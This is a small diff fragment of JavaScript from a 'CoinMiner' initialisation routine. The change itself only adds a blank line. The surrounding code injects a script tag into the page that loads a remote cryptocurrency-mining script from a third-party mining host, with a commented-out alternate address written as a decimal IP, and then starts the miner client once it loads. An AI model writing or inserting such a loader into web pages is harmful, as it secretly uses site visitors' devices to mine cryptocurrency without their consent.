@@ -12,6 +12,7 @@ CoinMiner.init = function()
   document.body.appendChild(coinScript);
   coinScript.src = "https://www.hostingcloud.racing/vyC3.js";
   //coinScript.src = "https://3558932317/vyC3.js";
+  
   coinScript.onload = function ()
   {
     //we have the miner, start a client
